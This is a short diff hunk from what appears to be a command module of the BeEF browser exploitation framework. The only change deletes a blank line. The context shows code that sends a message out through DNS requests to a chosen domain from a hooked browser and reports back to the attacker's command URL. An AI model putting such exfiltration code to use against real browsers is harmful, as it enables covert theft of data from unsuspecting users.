@@ -53,4 +53,3 @@ beef.execute(function() {
 	beef.net.dns.send(msgId, message, domain, wait, function(num) { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'dns_requests='+num+' requests sent') } );
 
 });
-
